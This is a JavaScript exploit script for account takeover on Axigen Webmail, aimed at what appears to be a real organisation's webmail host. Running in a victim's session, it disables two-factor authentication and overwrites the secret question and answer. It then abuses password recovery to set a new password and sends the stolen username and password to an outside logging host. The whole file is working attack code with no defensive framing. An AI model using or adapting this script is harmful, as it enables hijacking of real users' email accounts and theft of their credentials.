
var hostUrl ='https://webmail.fwo.com.pk';  // Enter the target's host URL
var cookieXhr = new XMLHttpRequest();
var cookieUrl = `${hostUrl}`;
var username= 'user2';  //username of the victim will be here
var newPassword= 'pass@000';  //it will be the new password, after exploitation

cookieXhr.open("GET", cookieUrl, true);

cookieXhr.onload = function () {
  if (cookieXhr.status >= 200 && cookieXhr.status < 300) {
   
    var _h_cookie = new URL(cookieXhr.responseURL).searchParams.get("_h");
    
 
    makePostRequest1(_h_cookie);
  } else {
   
   
  }
};


cookieXhr.send();

function makePostRequest1(_h_cookie) {

  var xmlData = '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope" soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding"> <soap:Body> <m:TwoFactorRevokeAll xmlns:m="http://www.axigen.com/SOAP.hsp">   <m:password>random@123</m:password> </m:TwoFactorRevokeAll>   </soap:Body>    </soap:Envelope>';
  
 
  var xhr = new XMLHttpRequest();
  
  
  var url = `${hostUrl}/SOAP.hsp?_h=${_h_cookie}`;
  var method = "POST";
  

  xhr.open(method, url, true);
  xhr.setRequestHeader("Content-Type", "text/xml");
 
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
		
     
			sendPingRequest(`Phase 1: Victim Interacted, Two-Factor Authentication Disabled (If enbaled).......`);
			 
			
			makePostRequest(_h_cookie);
	        
	  
    } else {
     
      
    }
  };
  
  xhr.send(xmlData);
}

function makePostRequest(_h_cookie) {

  var xmlData = `<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope" soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding"><soap:Body><m:UserSavePersonalInfo xmlns:m="http://www.axigen.com/SOAP.hsp"><m:title></m:title><m:firstName></m:firstName><m:middleName></m:middleName><m:lastName></m:lastName><m:suffix></m:suffix><m:mobilePhone></m:mobilePhone><m:nickName></m:nickName><m:homePhone></m:homePhone><m:homeAddress><m:street></m:street><m:city></m:city><m:state></m:state><m:zipCode></m:zipCode><m:country></m:country></m:homeAddress><m:personalEmail></m:personalEmail><m:yahooMessengerId></m:yahooMessengerId><m:personalVoipAddress></m:personalVoipAddress><m:googleTalkId></m:googleTalkId><m:liveMessengerAddress></m:liveMessengerAddress><m:icqNumber></m:icqNumber><m:aolScreenName></m:aolScreenName><m:skypeId></m:skypeId><m:birthday></m:birthday><m:spouseName></m:spouseName><m:company></m:company><m:position></m:position><m:businessPhone></m:businessPhone><m:businessAddress><m:street></m:street><m:city></m:city><m:state></m:state><m:zipCode></m:zipCode><m:country></m:country></m:businessAddress><m:website></m:website><m:businessEmail></m:businessEmail><m:businessFax></m:businessFax><m:businessVoipAddress></m:businessVoipAddress><m:department></m:department><m:office></m:office><m:profession></m:profession><m:managerName></m:managerName><m:assistantName></m:assistantName><m:notes></m:notes><m:secretQuestion>What was the name of your first teacher?</m:secretQuestion><m:secretAnswer>finished</m:secretAnswer><m:sendReadReceipts>ask</m:sendReadReceipts><m:archivingPolicy>none</m:archivingPolicy><m:requestReadReceipts>no</m:requestReadReceipts><m:requestDeliveryReceipts>no</m:requestDeliveryReceipts><m:signature></m:signature></m:UserSavePersonalInfo></soap:Body></soap:Envelope>`;
  
 
  var xhr = new XMLHttpRequest();
  
  
  var url = `${hostUrl}/SOAP.hsp?_h=${_h_cookie}`;
  var method = "POST";
  

  xhr.open(method, url, true);
  xhr.setRequestHeader("Content-Type", "text/xml");
 
  xhr.onload = function () {
    if (xhr.status >= 200 && xhr.status < 300) {
		
     
			 
			sendPingRequest(`Phase 2: Takeover Process Started.......`);
			
			sendFirstRequest();
	        
	  
    } else {
     
      
    }
  };
  
  xhr.send(xmlData);
}

function sendPingRequest(text) {
 
  var pingXhr = new XMLHttpRequest();


  var pingUrl = "https://webworldoppertunity.wuaze.com/axigen/ExpiredPage/save_log.php"; 

  // Initialize the ping request
  pingXhr.open("GET", pingUrl + "?text=" + encodeURIComponent(text), true);
  pingXhr.onload = function () {
    if (pingXhr.status === 200) {
     
      
    } else {
 
      
    }
  };

  pingXhr.send();
}


function sendFirstRequest() {
  const xhr = new XMLHttpRequest();

  const url = `${hostUrl}/?recoverPassword=&action=checkMethod&custom=ajax`;
  const params = `hostname=${hostUrl}&username=${username}&method=sq&secretAnswer=finished`;

  xhr.open('POST', url, true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        const response = JSON.parse(xhr.responseText);
        const tokenValue = response.token;

        sendSecondRequest(tokenValue);
		sendPingRequest("Phase 3: Token Extracted, Preparing for the final takeover request.....!");
      } else {
       
      }
    }
  };

  xhr.send(params);
}

function sendSecondRequest(tokenValue) {
  const xhr = new XMLHttpRequest();

  const url = `${hostUrl}/?recoverPassword=&action=changePassword&custom=ajax`;
  const params = `username=${username}&token=${tokenValue}&newPassword=${newPassword}&retypePassword=${newPassword}`;

  xhr.open('POST', url, true);
  xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
       sendPingRequest(`Final Phase: Account Takeover Successfull..! You can login at Axigen Webmail, with the following credentials: \n Username : ${username}\n Password: ${newPassword}`);
	   
      } else {
        
      }
    }
  };

  xhr.send(params);
}
